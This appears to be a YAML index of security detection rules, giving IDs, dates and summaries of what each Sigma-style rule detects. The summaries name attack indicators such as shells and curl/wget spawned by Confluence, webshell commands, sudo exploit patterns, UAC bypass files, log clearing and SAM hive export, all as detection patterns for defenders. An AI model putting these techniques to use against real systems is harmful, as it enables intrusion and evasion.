  Summary: This rule detects the spawning of suspicious child processes by an Atlassian
    Confluence server, which may indicate the successful exploitation of the CVE-2022-26134
    vulnerability. The monitored activity includes instances where the parent process
    is the Confluence server's Java process and the child process command lines contain
    executables like '/bin/sh', 'bash', 'dash', 'ksh', 'zsh', 'csh', 'fish', 'curl',
    'wget', or 'python'. This rule is aimed at identifying unauthorized or malicious
    operations initiated within the Confluence server environment on Linux systems.
  Updated-Date: '2024_09_03'
7fc30d63-728d-48d9-ad6f-14d14f4accf7:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 3e33bb8870c1a56749f1ee3304c68560
  Ruleset: emerging-threats
  Summary: This rule detects potential beaconing activity to specific domains that
    are associated with zero-day attacks on iOS devices. It identifies communication
    with a set of domains revealed by Kaspersky and the FSB as being involved in these
    attacks, including 'addatamarket.net,' 'ans7tv.net,' 'backuprabbit.com,' and several
    others. Detecting such traffic can indicate an ongoing or previous compromise
    of iOS devices through these domains, suggesting malicious command and control
    (C2) activity.
  Updated-Date: '2024_09_03'
7fcc54cb-f27d-4684-84b7-436af096f858:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 10425ef06a3fb6f54cc67357d88f9063
  Ruleset: core
  Summary: This rule detects users attempting to exploit a vulnerability in the sudo
    program, identified as CVE-2019-14287. This vulnerability allows a user to execute
    commands as root even if the user is excluded from doing so, posing a critical
    security risk. The rule identifies specific patterns in user entries, such as
    '-\*' and '\*4294967295', which are indicative of this exploit.
  Updated-Date: '2024_09_03'
7fd164ba-126a-4d9c-9392-0d4f7c243df0:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1c689c40a849fbc4017c463784c4bd70
  Ruleset: sigmahq
  Summary: This rule detects the creation of files with the ".one" or ".onepkg" extensions
    in suspicious or uncommon directories, such as '\AppData\Local\Temp\', '\Users\Public\',
    '\Windows\Temp\', and any paths ending in ':\Temp\'. These files are associated
    with Microsoft OneNote and their presence in such locations may indicate malicious
    activity, including the possibility of attackers leveraging OneNote attachments
    to deploy malware like AsyncRAT. The detection focuses on ensuring that the files
    are not created by legitimate OneNote processes from the standard installation
    path.
  Updated-Date: '2024_09_04'
7ff9db12-1b94-4a79-ba68-a2402c5d6729:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 812e9a48493bc6386e09ffbecab1d1c4
  Ruleset: core
  Summary: This rule detects common commands used in Windows webshells, which are
    often employed by attackers to maintain persistence and execute code on compromised
    servers. It specifically looks for URL-encoded versions of commands such as `whoami`,
    `net user`, and various `cmd`, `powershell`, `tasklist`, `wmic`, `ssh`, `python`,
    `ipconfig`, `wget`, `curl`, and `certutil`, among others. These commands can reveal
    system information, manipulate user accounts, run scripts, or interact with network
    resources. The rule is designed to inspect GET requests in webserver logs to identify
    these potentially malicious activities. It incorporates fields such as client
    IP, virtual host, URL, and response for thorough detection. Potential false positives
    include benign websites that discuss OS commands or user searches that inadvertently
    include these command strings in URLs.
  Updated-Date: '2024_09_03'
7fff6773-2baa-46de-a24a-b6eec1aba2d1:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d98c6d4934926ee2db6a2aae9078dfa8
  Ruleset: core
  Summary: This rule detects the use of a User Account Control (UAC) bypass technique
    that leverages NTFS reparse points and involves DLL hijacking through the executable
    `wusa.exe`. Specifically, it identifies file events targeting files in the user's
    temporary directory with the name `api-ms-win-core-kernel32-legacy-l1.DLL`. This
    method of bypass is associated with UACMe tool number 36 and poses a high level
    of threat as it pertains to defense evasion and privilege escalation tactics.
  Updated-Date: '2024_09_03'
801bd44f-ceed-4eb6-887c-11544633c0aa:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: eece82409ac39adb8091d223f6e86d22
  Ruleset: core
  Summary: This rule detects suspicious changes to the Windows Defender configuration.
    It monitors for specific modifications such as disabling anti-spyware, tamper
    protection, scanning of removable drives, and scanning of mapped network drives
    during a full scan, as well as changes to block-at-first-seen and SpyNet reporting
    settings. These changes are identified through EventID 5007, which indicates that
    the antimalware platform configuration has been altered. Such modifications can
    be indicative of defense evasion tactics and should be carefully investigated,
    although legitimate administrative actions might also trigger these alerts.
  Updated-Date: '2024_09_03'
8023d3a2-dcdc-44da-8fa9-5c7906e55b38:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c25217e8d29ccecbfa64afe1e71c1690
  Ruleset: emerging-threats
  Summary: This rule detects the creation of a specific file named 'file001.url' in
    the recent folder of Microsoft Office on Windows systems. The presence of this
    file has been observed during potential exploitations of the vulnerability identified
    as CVE-2023-36884. The rule aims to identify this behavior, which may indicate
    persistence or defense evasion techniques being employed by an attacker.
  Updated-Date: '2024_09_03'
8023f872-3f1d-4301-a384-801889917ab4:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 318223975dea9bcaddf7126d7881d74c
  Ruleset: core
  Summary: This rule detects instances where non-Sysinternals tools are setting the
    "accepteula" registry key, which is typically set during the execution of genuine
    Sysinternals utilities. Anomalous activities include modifying registry keys related
    to specific Sysinternals tools such as PsExec, ProcDump, Handle, LiveKd, Process
    Explorer, PsLoglist, PsPasswd, and Active Directory Explorer, with the goal of
    circumventing the End User License Agreement (EULA) acceptance process. This could
    indicate unauthorized or malicious use of these utilities under a different identity
    or with modified executables.
  Updated-Date: '2024_09_03'
8028c2c3-e25a-46e3-827f-bbb5abf181d7:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1919c978a1d88c8ab5085e50aded717e
  Ruleset: core
  Summary: This rule detects parameters associated with the WMImplant hack tool by
    identifying specific script block text. WMImplant is a post-exploitation tool
    used for various administrative tasks and malicious activities on Windows systems.
    The specific parameters being monitored include commands for changing user settings,
    generating command-line interfaces, executing commands, modifying registry entries,
    and controlling system services. It also tracks actions related to disabling or
    enabling Windows features such as WDigest and WinRM, managing scheduled jobs,
    killing processes, retrieving active user information, gathering basic system
    information, shutting down the power, checking system vacancy, and monitoring
    logon events. These indicators help in identifying potentially unauthorized or
    malicious use of the WMImplant tool.
  Updated-Date: '2024_09_03'
805c55d9-31e6-4846-9878-c34c75054fe9:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7f7a0938aadb429fca6b7ffb29b7bd60
  Ruleset: core
  Summary: This rule detects the presence of Octopus Scanner Malware by identifying
    specific file events on a Windows operating system, particularly the creation
    or modification of files named 'Cache134.dat' and 'ExplorerSync.db' within the
    '\AppData\Local\Microsoft\' directory. Octopus Scanner is known for targeting
    the open-source supply chain to embed malicious code in Java projects.
  Updated-Date: '2024_09_03'
808146b2-9332-4d78-9416-d7e47012d83d:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c42237ddc71c82c07bfb773ea7acf893
  Ruleset: core
  Summary: This rule detects access to .lock and .pid files associated with the BPFDoor
    malware in temporary file storage on Linux systems. Specifically, it monitors
    for activity involving the files `/var/run/haldrund.pid`, `/var/run/xinetd.lock`,
    and `/var/run/kdevrund.pid`. The BPFDoor malware is known for being an evasive
    backdoor that can compromise Linux environments by leveraging the Berkeley Packet
    Filter (BPF) infrastructure.
  Updated-Date: '2024_09_03'
80915f59-9b56-4616-9de0-fd0dea6c12fe:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6c3bbe8b504b7b88f981d3cf86f11425
  Ruleset: sigmahq
  Summary: This rule detects attempts to clear logs on a Linux system, which adversaries
    might do to hide evidence of an intrusion. It specifically monitors the execution
    of commands like '/rm', '/shred', and '/unlink' in conjunction with references
    to directories '/var/log' and '/var/spool/mail'. These actions can indicate an
    effort to erase system records and hinder forensic investigations.
  Updated-Date: '2024_09_04'
80b708f3-d034-40e4-a6c8-d23b7a7db3d1:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7e7c360c2cb2a5a38d6b49b7ad74158e
  Ruleset: core
  Summary: This rule detects obfuscated PowerShell scripts executed via standard input
    (stdin). It monitors for event ID 4697 within Windows Security logs, focusing
    on instances where service file names contain specific patterns such as "set",
    "&&", "environment", "invoke", and "${input)". These patterns are indicative of
    obfuscation techniques commonly used to evade security defenses. This detection
    method aims to identify and mitigate potential threats associated with obfuscated
    script execution, which poses a high risk to the system.
  Updated-Date: '2024_09_03'
80e1f67a-4596-4351-98f5-a9c3efabac95:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2d2a423ce365de08e6b186c5e28f86f5
  Ruleset: core
  Summary: This rule detects the creation of scheduled tasks within the 'Windows\System32\Tasks'
    directory by processes executed from suspicious locations such as '\AppData\',
    'C:\PerfLogs', and '\Windows\System32\config\systemprofile'. This behavior can
    be indicative of persistence mechanisms used by malicious software to maintain
    access and execute tasks on a compromised system.
  Updated-Date: '2024_09_03'
80eeab92-0979-4152-942d-96749e11df40:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e016546978534d900fc4599c3cb0dc53
  Ruleset: sigmahq
  Summary: This rule detects modifications or deletions of Keyvault Keys within Azure.
    It identifies various operations such as updating, creating, importing, recovering,
    restoring, deleting, backing up, and purging of keys. This surveillance is critical
    to monitor unauthorized or suspicious activities involving key vaults. While legitimate
    administrative actions might trigger the rule, it advises verification of the
    user identity and context to rule out false positives. Actions taken by unfamiliar
    users should be thoroughly investigated to ensure security integrity.
  Updated-Date: '2024_09_04'
80fc36aa-945e-4181-89f2-2f907ab6775d:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a8a4ba368371364c2f766c7c0d1d65f4
  Ruleset: core
  Summary: This rule detects a potential UAC (User Account Control) bypass attempt
    through the usage of IEInstal.exe, associated with the UACMe tool. It monitors
    for processes with high or system integrity levels where ieinstal.exe is the parent
    process, and the child process is named consent.exe located within the Temp directory
    of the AppData folder. This pattern is indicative of an effort to escalate privileges
    or evade defenses on Windows systems.
  Updated-Date: '2024_09_03'
811e0002-b13b-4a15-9d00-a613fce66e42:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 513e51cb95e906305e3d27f4336893db
  Ruleset: sigmahq
  Summary: This rule detects the execution of Process Hacker by identifying specific
    binary metadata such as image paths, original file names, descriptions, and product
    names, as well as hash values including MD5, SHA1, SHA256, and IMPHASH. Process
    Hacker is a tool that enables users to view and manipulate processes and kernel
    options at a low level. It has been known to be abused by threat actors through
    older vulnerable versions for manipulating system processes, making its detection
    crucial for maintaining system security.
  Updated-Date: '2024_09_04'
811f459f-9231-45d4-959a-0266c6311987:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 731adb70d183a8243750087079757189
  Ruleset: core
  Summary: This rule detects suspicious child processes of "BgInfo.exe," a Microsoft
    binary intended for displaying system information on the desktop. Anomalous child
    processes such as 'calc.exe', 'cmd.exe', 'cscript.exe', 'mshta.exe', 'notepad.exe',
    'powershell.exe', 'pwsh.exe', and 'wscript.exe', particularly when originating
    from directories like '\AppData\Local\', '\AppData\Roaming\', ':\Users\Public\',
    ':\Temp\', ':\Windows\Temp\', and ':\PerfLogs\', may indicate an abuse of BgInfo.exe
    to proxy execution via external VBScript, potentially bypassing application whitelisting
    defenses.
  Updated-Date: '2024_09_03'
812837bb-b17f-45e9-8bd0-0ec35d2e3bd6:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d7efb40a5ee0f083e3950df0fc520e42
  Ruleset: sigmahq
  Summary: This rule detects a suspicious PowerShell process that includes the 'bxor'
    command. 'bxor' is an alternative obfuscation method to base64 encoded commands.
    The detection focuses on PowerShell host activity where the 'bxor' command, typically
    used in combination with 'char' and 'join', is present in the command line arguments,
    indicating potential obfuscation and malicious activity.
  Updated-Date: '2024_09_04'
81315b50-6b60-4d8f-9928-3466e1022515:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: beff9ebb381090fa5453b8ce28cc731c
  Ruleset: sigmahq
  Summary: This rule detects unusual processes accessing the desktop.ini file, which
    can be leveraged to manipulate how Windows Explorer displays a folder's content,
    such as renaming files without altering them on the disk. The rule aims to identify
    potentially malicious activities that exploit desktop.ini for post-exploitation
    by excluding legitimate system processes and specific software like JetBrains
    Toolbox and Windows upgrade procedures from triggering false positives.
  Updated-Date: '2024_09_04'
81325ce1-be01-4250-944f-b4789644556f:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d1c967a8aadd14759bab6c2c1bd1d054
  Ruleset: sigmahq
  Summary: This rule detects the creation of scheduled tasks using the `schtasks.exe`
    utility when the command points to directories associated with environment variables
    or specific folders commonly leveraged by malware. Suspicious directories include
    paths like `\AppData\Local\`, `\AppData\Roaming\`, `\Users\Public`, and others.
    It targets commands executed by relevant processes, particularly those with a
    parent process of `svchost.exe` managing the Schedule service. The rule includes
    filters to exclude benign activities related to known legitimate software installations,
    such as Avira antivirus and K-Lite Codec updates. It primarily aims to identify
    potentially malicious tasks created in atypical directories that could indicate
    suspicious behavior.
  Updated-Date: '2024_09_04'
814c95cc-8192-4378-a70a-f1aafd877af1:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6c7f45b90bb10095dde2ce1d2c32101e
  Ruleset: sigmahq
  Summary: This rule detects the use of the OpenConsole binary to launch other binaries
    as a means to bypass application whitelisting on Windows systems. It filters out
    legitimate use from the default path of WindowsTerminal and focuses on instances
    where OpenConsole.exe is used in potentially unauthorized or malicious contexts.
  Updated-Date: '2024_09_04'
814ddeca-3d31-4265-8e07-8cc54fb44903:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e58716ecedb04ffe30752904a55360dd
  Ruleset: core
  Summary: This rule detects the creation of a file named 'C:\Windows\livekd.dmp',
    which indicates the use of LiveKD for kernel memory dumping. LiveKD is typically
    leveraged for live kernel debugging and could be associated with defense evasion
    or privilege escalation activities. This file creation should be investigated,
    especially on production systems, to ensure it is not related to unauthorized
    debugging activities.
  Updated-Date: '2024_09_03'
8150732a-0c9d-4a99-82b9-9efb9b90c40c:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: dda175b48cb71e3d0aa9db53926c2b88
  Ruleset: sigmahq
  Summary: This rule detects the usage of Msiexec.exe to perform quiet installations
    of packages hosted on remote locations. The detection focuses on identifying the
    process creation of Msiexec.exe with command line arguments indicative of a quiet
    installation, such as '-q', in conjunction with remote sources like URLs starting
    with 'http' or network paths represented by '\\\\'. This behavior may indicate
    a defense evasion technique commonly associated with malicious activities, such
    as those referenced in the context of the Raspberry Robin worm, which facilitates
    pre-ransomware operations.
  Updated-Date: '2024_09_04'
815cd91b-7dbc-4247-841a-d7dd1392b0a8:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e567664b6672f27b07c06dd01381eecb
  Ruleset: core
  Summary: This rule detects attempts by adversaries to conceal their activities from
    Sysmon logging through specific error messages. The monitored errors include messages
    such as "Failed to open service configuration with error" and "Failed to connect
    to the driver to update the configuration," which may indicate malicious attempts
    to disrupt or manipulate Sysmon's functionality. The detection mechanism distinguishes
    these events from benign administrative actions by filtering out known error messages
    related to write protection and specific error codes.
  Updated-Date: '2024_09_03'
817f252c-5143-4dae-b418-48c3e9f63728:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1f3d3e0a5da731be44d86afeb8855a53
  Ruleset: sigmahq
  Summary: This rule detects the enabling of the Windows Recall feature via registry
    manipulation using the "reg.exe" utility. Specifically, it monitors actions where
    the "DisableAIDataAnalysis" registry value is deleted or set to 0, indicating
    the activation of Windows Recall. Adversaries might use this technique for post-exploitation
    discovery and data collection. This rule operates under the assumption that the
    Windows Recall feature was explicitly disabled beforehand and has been re-enabled
    by unauthorized means.
  Updated-Date: '2024_09_04'
818f7b24-0fba-4c49-a073-8b755573b9c7:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 592baeedcddf959ba1f7bdf1a20e4b07
  Ruleset: core
  Summary: This rule detects suspicious subprocesses originating from web server processes,
    which could indicate the presence of web shell malware on a Linux system. It identifies
    subprocesses spawned by web server applications such as HTTPD, Lighttpd, Nginx,
    Apache2, Node.js, and Caddy, as well as Java subprocesses linked to Tomcat and
    WebSphere. The subprocesses considered suspicious include common administrative
    commands like 'whoami', 'ifconfig', 'ip', 'uname', 'cat', 'crontab', 'hostname',
    'iptables', 'netstat', 'pwd', and 'route'. Detection of such subprocesses could
    signify unauthorized activities typically associated with web shell exploitation.
  Updated-Date: '2024_09_03'
818fee0c-e0ec-4e45-824e-83e4817b0887:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 3f6337d27eaffb0e9415283501913cdf
  Ruleset: sigmahq
  Summary: This rule detects modifications or deletions to ClusterRoles and Roles
    within an Azure Kubernetes environment. Monitoring includes operations such as
    writing, deleting, binding, and escalating actions related to both ClusterRoles
    and Roles. Malicious actors may exploit these activities to gain or alter access
    permissions, potentially impacting the security and functionality of containerized
    applications. It is important to distinguish between legitimate administrative
    actions and unauthorized changes to prevent potential security breaches.
  Updated-Date: '2024_09_04'
81a0ecb5-0a41-4ba1-b2ba-c944eb92bfa2:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7cd3fa3e8fb4e0a59b87a32d578286e2
  Ruleset: core
  Summary: This rule detects the use of Winget to add a new download source using
    an insecure HTTP protocol. Winget does not permit the addition of insecure sources,
    so such activity may indicate suspicious behavior or possibly a typographical
    error.
  Updated-Date: '2024_09_03'
81ebd28b-9607-4478-bf06-974ed9d53ed7:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d3e333ed58b9954c06edeff034e08b06
  Ruleset: sigmahq
  Summary: This rule detects the execution of Dnx.EXE, which is a utility that allows
    for the execution of C# code. Attackers may exploit Dnx.EXE to bypass application
    whitelisting mechanisms, posing a security risk.
  Updated-Date: '2024_09_04'
8202070f-edeb-4d31-a010-a26c72ac5600:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 74068b25d1a04a69b046e791c70d9c6a
  Ruleset: core
  Summary: This rule detects potentially suspicious processes spawned by web server
    processes, indicative of web shell placement or exploitation. It monitors common
    web server executables such as caddy.exe, httpd.exe, nginx.exe, php-cgi.exe, and
    tomcat.exe. The intention is to identify unusual child processes, such as arp.exe,
    cmd.exe, powershell.exe, and others, which may suggest malicious activity. Specific
    filters are applied to reduce false positives from legitimate applications like
    ManageEngine's ADManager. The focus is on observing process creation events that
    deviate from normal web server operations.
  Updated-Date: '2024_09_03'
821b4dc3-1295-41e7-b157-39ab212dd6bd:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b78a2102128a1767480a23c65d6a3f89
  Ruleset: core
  Summary: This rule detects sign-ins originating from IP addresses known to be infected
    with malware, which actively communicates with a bot server. The infected IP addresses
    pose significant security risks as they may be utilized for unusual or malicious
    activities.
  Updated-Date: '2024_09_03'
821bcf4d-46c7-4b87-bc57-9509d3ba7c11:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d4ecc9ebebeb9477f70172815b54c67b
  Ruleset: sigmahq
  Summary: This rule detects attempts to enable the root account on macOS using the
    "dsenableroot" command. Enabling the root account in this way can indicate potential
    unauthorized access or persistence mechanisms being employed. The rule specifically
    monitors process creation events where the "dsenableroot" command is executed,
    except when the command line includes arguments to disable the root account.
  Updated-Date: '2024_09_04'
82343930-652f-43f5-ab70-2ee9fdd6d5e9:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: afca2da60f2918d5c21b433a4cedd862
  Ruleset: sigmahq
  Summary: This rule detects potential abuse of the "ShellDispatch.dll" functionality
    to execute arbitrary binaries via the "ShellExecute" method. It specifically identifies
    instances where "rundll32.exe" is used to invoke "RunDll_ShellExecuteW" on a Windows
    system. This behavior can indicate attempts to execute unauthorized actions, likely
    related to attack vectors involving execution and defense evasion.
  Updated-Date: '2024_09_04'
82880171-b475-4201-b811-e9c826cd5eaa:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 08b3e5756e8159e4739887c2352d0f99
  Ruleset: core
  Summary: This rule detects the export of critical registry keys to a file on Windows
    systems by monitoring the process creation logs for specific characteristics.
    The detection focuses on instances where the Regedit executable is used with command-line
    arguments indicative of exporting registry hives, specifically targeting the HKEY_LOCAL_MACHINE
    (HKLM) registry paths such as `\system`, `\sam`, and `\security`. This activity
    can be associated with malicious behavior, including exfiltration of sensitive
    information from the system. The rule specifically filters for command lines that
    contain the flag `-E` and references the file paths commonly associated with critical
    registry hives. While such actions could be performed for legitimate purposes
    such as backups or forensic investigations, they are flagged due to their potential
    for abuse in data exfiltration.
  Updated-Date: '2024_09_03'
8289bf8c-4aca-4f5a-9db3-dc3d7afe5c10:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 327566e306dd52966f226324080d76d2
  Ruleset: core
  Summary: This rule detects the Code Integrity (CI) engine blocking processes from
    loading unsigned DLLs that are found in suspicious locations such as public user
    directories, performance logs, desktop, downloads, local temporary application
    data, and the Windows temporary folder. These activities typically signify attempts
    to evade security mechanisms and are associated with defense evasion techniques.
    The detection is triggered by specific event IDs indicating such occurrences,
    which helps identify potential security threats.
  Updated-Date: '2024_09_03'
828af599-4c53-4ed2-ba4a-a9f835c434ea:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 608f72216d8b2a1fc2f7e6ea781bbdf7
  Ruleset: core
  Summary: This rule detects an attempt to hijack the DLL search order for the Fax
    service on Windows systems. It monitors for the Fax service executable (fxssvc.exe)
    attempting to load the ualapi.dll file, which does not exist by default. This
    behavior can be exploited by an attacker to sideload a malicious DLL, enabling
    persistence or defense evasion techniques. The detection focuses on identifying
    the suspicious loading of ualapi.dll that is not originating from the known Windows
    directory (C:\Windows\WinSxS).
  Updated-Date: '2024_09_03'
829a3bdf-34da-4051-9cf4-8ed221a8ae4f:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 643989cc8f38e9f5a081c5428d37cbe9
  Ruleset: core
  Summary: This rule detects DLL sideloading of Microsoft Office-related DLLs from
    non-standard locations. Specifically, it monitors for the loading of the 'outllib.dll'
    file, excluding instances where this file is loaded from standard Office installation
    directories such as 'C:\Program Files\Microsoft Office\OFFICE' and its variants.
    This technique is often associated with defense evasion, persistence, and privilege
    escalation tactics employed by attackers.
  Updated-Date: '2024_09_03'
82a6714f-4899-4f16-9c1e-9a333544d4c3:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9b8aa1e77599e8a23caecd965e37068b
  Ruleset: sigmahq
  Summary: This rule detects the execution of the `certutil.exe` utility with the
    "-encode" flag, used to encode files into base64, when these files are located
    in potentially suspicious directories such as `AppData\Roaming`, `Desktop`, `Local\Temp`,
    `PerfLogs`, `Users\Public`, `Windows\Temp`, or `$Recycle.Bin`.
  Updated-Date: '2024_09_04'
83314318-052a-4c90-a1ad-660ece38d276:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0232987ec3b6f5d107372bd0ced94631
  Ruleset: core
  Summary: This rule detects the BlackByte ransomware setting specific registry values
    to escalate privileges and facilitate lateral movement and encryption on Windows
    systems. It monitors changes to registry keys related to LocalAccountTokenFilterPolicy,
    EnableLinkedConnections, and LongPathsEnabled, with the specific indicator being
    DWORD set to 0x00000001.
  Updated-Date: '2024_09_03'
833ef470-fa01-4631-a79b-6f291c9ac498:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8e8f583cb756fecaad0847bc02f4f659
  Ruleset: core
  Summary: This rule detects when an attacker adds a new "Debugger" value to the "Hangs"
    key in the Windows registry to achieve persistence. This technique ensures that
    the specified debugger will be invoked whenever an application crashes, enabling
    malicious code to execute consistently during application failures.
  Updated-Date: '2024_09_03'
8344c0e5-5783-47cc-9cf9-a0f7fd03e6cf:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e425bd8422c72463ae953c4cd31e6bd5
  Ruleset: sigmahq
  Summary: This rule detects suspicious usage of the "find" binary on Linux systems,
    indicating potential discovery activities. Specifically, it identifies command
    executions where "find" is used with certain permission-related parameters, such
    as '-perm -4000', '-perm -2000', and '-perm 0777'. These parameters are often
    employed to discover files with specific permissions, which might indicate an
    attempt to locate files of interest for privilege escalation or other malicious
    activities.
  Updated-Date: '2024_09_04'
835747f1-9329-40b5-9cc3-97d465754ce6:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2e64403e8c4cc9e8472abab90cda658e
  Ruleset: sigmahq
  Summary: This rule detects modifications or deletions of Azure Application Security
    Groups. It identifies activities related to the writing or deleting of these security
    groups, which can be critical for maintaining infrastructure security. Monitoring
    these actions is essential to ensure they are authorized and performed by legitimate
    system administrators. Instances of modification or deletion by unfamiliar users
    should be investigated for potential security breaches.
  Updated-Date: '2024_09_04'
835e75bf-4bfd-47a4-b8a6-b766cac8bcb7:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 4e4ff7133cd80a6ec3f2776d173bc47a
  Ruleset: core
  Summary: This rule detects an uncommon child process initiated by Setres.EXE, a
    process and tool specific to Windows servers used for setting screen resolutions.
    Setres.EXE can potentially be exploited to launch any file with a name containing
    the word "choice" from the current execution path. The rule identifies instances
    where Setres.EXE spawns such processes, excluding legitimate locations of choice.exe
    in System32 and SysWOW64 directories, to highlight potential misuse or abuse.
  Updated-Date: '2024_09_03'
8366030e-7216-476b-9927-271d79f13cf3:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 64df3f3f60b5fb6d0eab065c94b5dc50
  Ruleset: sigmahq
  Summary: This rule detects interruptions in the authentication process within Microsoft
    Azure by monitoring for specific result types indicating issues such as device
    authentication requirements, device authentication failures, and unsatisfied external
    security challenges.
  Updated-Date: '2024_09_04'
83809e84-4475-4b69-bc3e-4aad8568612f:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9fb6923c79c894a22e70bddb5cf365cf
  Ruleset: sigmahq
  Summary: This rule detects the installation of an Exchange Transport Agent by monitoring
    process creation events in a Windows environment. It specifically looks for command
    lines that include 'Install-TransportAgent'. This activity is associated with
    establishing persistence and corresponds to a known attack technique. The detection
    can also differentiate between legitimate and suspicious installations using the
    AssemblyPath indicator.
  Updated-Date: '2024_09_04'
83844185-1c5b-45bc-bcf3-b5bf3084ca5b:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: cdbe6384f6d1d5218b066c3e84f72988
  Ruleset: core
  Summary: This rule detects suspicious encoded scripts within Windows Management
    Instrumentation (WMI) Event Consumers. These scripts are identified by the presence
    of base64-encoded content that includes indicators like "WriteProcessMemory" or
    specific error messages such as "This program cannot be run in DOS mode" and "This
    program must be run under Win32". Such encoded payloads may signify potential
    malicious activity, often associated with techniques for execution and persistence.
    Key details logged include the user and operation involved in the event.
  Updated-Date: '2024_09_03'
8384bd26-bde6-4da9-8e5d-4174a7a47ca2:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ed927f7c4aa9b8d4b0c6a771bb32d495
  Ruleset: core
  Summary: This rule detects the DNS resolution of a `.onion` address related to Tor
    routing networks using the Microsoft Windows DNS Client service. Tor is known
    for enabling anonymous communication by directing internet traffic through a free,
    worldwide, volunteer overlay network. The detection is triggered by an event with
    ID 3008 where the queried name contains the `.onion` domain, indicative of hidden
    services accessed via the Tor network.
  Updated-Date: '2024_09_03'
83865853-59aa-449e-9600-74b9d89a6d6e:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 28f5d5ab4cdb9e1833c1429a57b99ab3
  Ruleset: sigmahq
  Summary: This rule detects instances where an attacker is using the SoundRecorder
    application to capture audio on a Windows system. The detection is based on the
    presence of the SoundRecorder.exe executable in process creation logs and specific
    command-line arguments indicating file output. Legitimate use of audio capture
    by authorized users may trigger false positives.
  Updated-Date: '2024_09_04'
83c161b6-ca67-4f33-8ad0-644a0737cf07:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 65730d26c5817d2d6df782dc1348c55e
  Ruleset: sigmahq
  Summary: This rule detects the installation of suspicious applications by monitoring
    for the addition of shortcuts to the app resolver cache in Windows. Specifically,
    it looks for EventID 28115 and checks if the application names or application
    IDs contain keywords related to known software such as Zenmap, AnyDesk, Wireshark,
    and OpenVPN.
  Updated-Date: '2024_09_04'
83c17918-746e-4bd9-920b-8e098bf88c23:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
